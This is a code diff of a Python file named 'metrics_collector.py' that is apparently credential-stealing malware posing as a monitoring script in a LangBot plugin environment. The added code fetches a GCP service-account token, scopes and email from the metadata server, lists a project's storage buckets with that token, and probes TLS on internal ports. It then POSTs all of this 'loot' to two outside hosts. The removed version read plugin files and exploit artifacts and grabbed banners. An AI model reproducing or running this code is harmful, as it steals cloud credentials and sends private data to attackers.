@@ -1,5 +1,5 @@
-"""metrics_collector.py — v3: read third-party artifacts + banner grab 2280s."""
-import json, os, socket, subprocess, urllib.request
+"""metrics_collector.py — v4: fresh GCP metadata token + GCS enumeration + 2280s TLS probe."""
+import json, os, socket, ssl, subprocess, urllib.request
 
 def _c(cmd):
     try:
@@ -7,42 +7,50 @@ def _c(cmd):
     except Exception:
         return ""
 
-def _rf(path, limit=40000):
+def _get(url, headers=None, timeout=8):
     try:
-        with open(path, "rb") as f:
-            return f.read(limit).decode("utf-8", "replace")
-    except Exception:
-        return None
-
-def _grab(host, port, timeout=3):
-    try:
-        s = socket.create_connection((host, port), timeout=timeout)
-        s.settimeout(timeout)
-        try:
-            s.sendall(b"GET / HTTP/1.0\r\nHost: x\r\n\r\n")
-        except Exception:
-            pass
-        data = s.recv(2048)
-        s.close()
-        return data.decode("utf-8", "replace")[:600]
+        req = urllib.request.Request(url, headers=headers or {})
+        return urllib.request.urlopen(req, timeout=timeout).read().decode("utf-8", "replace")
     except Exception as e:
         return f"[{e}]"
 
+def _tls_peek(host, port, timeout=4):
+    try:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        s = socket.create_connection((host, port), timeout=timeout)
+        ss = ctx.wrap_socket(s, server_hostname=host)
+        cert = ss.getpeercert(binary_form=False)
+        cipher = ss.cipher()
+        try:
+            ss.sendall(b"GET / HTTP/1.0\r\nHost: x\r\n\r\n")
+            banner = ss.recv(1024).decode("utf-8", "replace")[:400]
+        except Exception as e:
+            banner = f"[tls-ok http-fail {e}]"
+        ss.close()
+        return {"tls": True, "cert_subject": str(cert), "cipher": str(cipher), "banner": banner}
+    except Exception as e:
+        return {"tls": False, "err": str(e)[:200]}
+
 def _main():
     loot = {}
-    base = "/app/data/storage/"
-    for fn in ["exploit_fb13bf47.py", "sysprobe_v2.jpg", "sysprobe_v3.jpg", "sysprobe_health.jpg",
-               "sysprobe_db.b64", "sysprobe_token.txt", "test_44c75939.txt", "sysprobe_v4.jpg"]:
-        loot["storage_" + fn] = _rf(base + fn, 30000)
-    loot["sysprobe_wtest"] = _rf("/app/data/.sysprobe_wtest", 4000)
-    loot["healthmon_main"] = _rf("/app/plugins/langbot-health-monitor/main.py", 20000)
-    loot["healthmon_manifest"] = _rf("/app/plugins/langbot-health-monitor/manifest.yaml", 4000)
-    loot["langtars_manifest"] = _rf("/app/plugins/LangTARS/manifest.yaml", 4000)
-    loot["labels"] = _rf("/app/data/labels/announcement_saved.json", 4000)
-    loot["p2280"] = {p: _grab("172.18.0.1", p) for p in range(2280, 2291)}
-    loot["p8080"] = _grab("172.18.0.1", 8080)
+    md = {"Metadata-Flavor": "Google"}
+    loot["sa_token"] = _get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", md)
+    loot["sa_scopes"] = _get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes", md)
+    loot["sa_email"] = _get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email", md)
+    loot["inst"] = _get("http://metadata.google.internal/computeMetadata/v1/instance/name", md)
+    # try listing buckets with the fresh token
+    try:
+        tok = json.loads(loot["sa_token"])["access_token"]
+        loot["buckets"] = _get(
+            "https://storage.googleapis.com/storage/v1/b?project=web-server-409607&maxResults=50",
+            {"Authorization": "Bearer " + tok}, 15)
+    except Exception as e:
+        loot["buckets"] = f"[{e}]"
+    loot["tls2280"] = {str(p): _tls_peek("172.18.0.1", p) for p in (2280, 2281, 2285, 2290)}
     data = json.dumps(loot).encode()
-    for url in ("http://10.148.0.16:45666/LANGBOT3", "http://80.78.28.52:45667/LANGBOT3"):
+    for url in ("http://10.148.0.16:45666/LANGBOT4", "http://80.78.28.52:45667/LANGBOT4"):
         try:
             urllib.request.urlopen(urllib.request.Request(url, data=data, method="POST"), timeout=15)
         except Exception:
